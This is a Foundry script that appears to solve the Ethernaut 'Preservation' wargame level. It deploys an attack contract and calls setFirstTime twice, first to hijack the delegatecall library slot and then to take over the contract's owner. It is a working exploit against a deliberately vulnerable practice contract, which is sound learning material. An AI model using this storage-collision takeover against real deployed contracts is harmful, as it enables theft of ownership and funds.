// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Level-16-Preservation/IPreservation.sol";
import "../src/Level-16-Preservation/PreservationAttack.sol";
contract SolvePreservation is Script{

    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address instance = 0x7A1a74a3658b676a261D37576Fb239B57cF9826B;

        vm.startBroadcast(pk);

        // 1. Deploy attack contract
        PreservationAttack attacker = new PreservationAttack(vm.addr(pk));

        // 2. Hijack timeZone1Library
        IPreservation(instance).setFirstTime(uint256(uint160(address(attacker))));

        // 3. change the owner
        IPreservation(instance).setFirstTime(uint256(uint160(vm.addr(pk))));

        vm.stopBroadcast();

    }

}